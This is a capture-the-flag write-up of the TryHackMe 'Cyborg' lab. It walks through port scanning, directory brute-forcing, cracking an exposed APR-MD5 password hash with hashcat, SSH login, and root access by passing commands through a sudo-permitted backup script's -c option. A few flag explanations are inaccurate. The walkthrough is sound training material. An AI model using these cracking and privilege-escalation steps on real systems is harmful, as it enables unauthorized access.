# TRYHACKME – Cyborg (CTF)

![Cyborg.png](img/Cyborg.png)

Use nmap tool to scan target ports

**`nmap 10.10.23.140`**

![nmap-scan1.png](img/nmap-scan1.png)

Port: Services:

22     ssh (Secure Shell)

80     http (Hypertext Transfer Protocol)

Use gobuster tool to brute-force directories on web servers

`gobuster dir -u http://10.10.23.140 -w /usr/share/seclists/Discovery/Web-Content/common.txt`

> dir –> to search for directories

> -u –> specify the URL

> -w –> path to the worldlist

![gobuster-scan1.png](img/gobuster-scan1.png)

Directories found:

/admin

/etc

![etc-dir1.png](img/etc-dir1.png)

![etc-squid-dir1.png](img/etc-squid-dir1.png)

![md5-hash1.png](img/md5-hash1.png)

**Identify the hash type**

**`hash-identifier`** 

**> hash** –> **$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.**

![hash-identifier1.png](img/hash-identifier1.png)

**hash type: md5(APR)**

Crack hash using hashcat tool

**`hashcat -m 1600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`**

> -m –> specifies the hash type (1600 – md5 APR)

> -a –> specifies the attack mode (0 – brute force)

![hashcat1.png](img/hashcat1.png)

![admin-index-page-file1.png](img/admin-index-page-file1.png)

Unzip the file

**`tar –xf archive.tar`**

> -xf –> used to extract .rar files

![list-zip-file1.png](img/list-zip-file1.png)

![unzip-tar-file1.png](img/unzip-tar-file1.png)

**`cat README`**

Give as a hint to search for BorgBackup tool

Download borgbackup tool

**`apt install borgbackup –y`**

Extract files with borg

**`sudo borg extract Downloads/home/field/dev/final_archive::music_archive`**

Use the previous cracked  password

**`cat note.txt`**

![cat-file1.png](img/cat-file1.png)

Connect to the target machine via ssh

**`ssh alex@10.10.159.75`**

![ssh1.png](img/ssh1.png)

**`cat user.txt`**

![cat-file2.png](img/cat-file2.png)

List the user privileges to see what we can do with this user

**`sudo -l`**

![list-user-privileges1.png](img/list-user-privileges1.png)

alex can run this script as “sudo”

`cd /etc/mp3backups`

![mv-dir-mp3backups1.png](img/mv-dir-mp3backups1.png)

**`cat backup.sh`**

![cat-file3.png](img/cat-file3.png)

Optional arguments can be passed through this instruction (OPTARG) 

List directories on root

**`sudo ./backup.sh -c “ls /root”`**

> -c –> pass a command

![run-file-arguments1.png](img/run-file-arguments1.png)

**`sudo ./backup.sh -c “cat /root/root.txt”`**

![run-file-aguments2.png](img/run-file-aguments2.png)
